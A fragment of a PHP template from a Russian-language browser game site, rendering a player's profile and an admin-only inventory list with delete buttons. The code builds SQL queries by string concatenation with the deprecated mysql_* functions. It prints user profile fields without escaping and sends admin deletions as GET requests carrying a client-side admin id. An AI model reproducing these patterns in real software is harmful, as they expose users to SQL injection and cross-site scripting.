	if($u->info['align']>1 && $u->info['align']<2 || $u->info['align']>3 && $u->info['align']<4 || $u->info['admin']>0)
	{
		echo '<br><small style="color:grey;">';
	}
}
if($inf['info_delete']==0 || (($u->info['align']>1 && $u->info['align']<2) || ($u->info['align']>3 && $u->info['align']<4) || $u->info['admin']>0))
{
if($u->info['admin']>0){
?> 

<div class="subAll">
	<style type="text/css">
		#sub_li{
			padding: 0px;
		}
		#sub_li li{
			position: relative;
			border: 1px solid black;
			width: 140px;
			height: 200px;
			text-align: center;
			float: left;
			display: inline-block;
		}
		#sub_li li h3{
			font-size: 11.5px;
		}
	</style>
	<h3>Предметы игрока в инвентаре:</h3>
	<ul id="sub_li">
	<?php 
		$item_us = mysql_query('SELECT * FROM `items_users` WHERE `uid` = "'.$inf['id'].'" AND `delete` = "0"');
		while($it_is = mysql_fetch_array($item_us)){
			echo "<li>";
			$name_us = mysql_fetch_array(mysql_query('SELECT * FROM `items_main` WHERE `id` = "'.$it_is['item_id'].'"'));
			echo "<div style='height: 150px;'><h3 rel='tooltip' title='id = ".$name_us['id']."'>".$name_us['name']."</h3>";
			echo '<img src="http://img.likebk.com/i/items/'.$name_us['img'].'"></div>';
			echo '<input class="del_sub_per" id_su="'.$it_is['id'].'" style="width: 100px; height: 25px; margin: 0 auto;" type="submit" name="button" value="Удалить" />';
			echo "</li>";
		}
	?>
	</ul>
</div>
<script type="text/javascript">
	$('.del_sub_per').click(function(){
		var id = $(this).attr('id_su');
		var id_user = "<?php echo $u->info['id']?>";
		$.get("jx/delet_sub_per.php?id_sb="+id+'&id_adm='+id_user, function(html){
			alert(html);
			location.reload();
		});
	});
</script>
<?php }?>
<div style="clear: both;"></div>
<div style="line-height:11pt; margin-left: 20px;">   
<? if($inf['info_delete']==0){ ?><H3 align="center" style="color:#8f0000">Анкетные данные</H3><? } ?>
<?
if($inf['name'] != '') {
?>
Имя: <? echo $inf['name']; ?><BR><? } ?>
Пол:
<? $sex[0] = 'Мужской'; $sex[1] = 'Женский'; echo $sex[$inf['sex']]; ?><BR>
<? if($inf['city_real']!=''){ ?>
Город: <? echo $inf['city_real']; ?><BR><? } ?>
<? if($inf['icq']>0 && $inf['icq_hide']==0){ echo 'ICQ: '.$inf['icq'].' <img height="14" title="ICQ Status bar" src="http://web.icq.com/whitepages/online?img=9&icq='.$inf['icq'].'"><br />'; } ?>
<? if(isset($inf['homepage']) && $inf['homepage']!='' && $inf['level']>4) { 
$url = ((substr($inf['homepage'],0,4)=='http'?"":"http://").$inf['homepage']);
?>
 Домашняя страница: <A HREF="<? echo $url; ?>" target="_blank"><? echo $url; ?></A><BR> <? } ?>
<? if($inf['deviz']!=''){ ?>
Девиз: <code><? echo $inf['deviz']; ?></code><BR>  <? } ?>
<? if($inf['hobby']!=''){ ?>  
Увлечения / хобби:<BR>
<? 
		echo str_replace("\n",'<br>',$inf['hobby']); 
	}
	if($inf['info_delete']!=0)
	{
		echo '</small>';
	}
}
echo '<br><br><div align="right">'.$c['counters_noFrm'].'</div>';
?>
</div>
<center><b><font size="1" face="verdana" color="black">&copy; 2016-<?=date('Y')?>, «www.likebk.com»™ </font></b></center>
<br /><br />
</body>
</html>
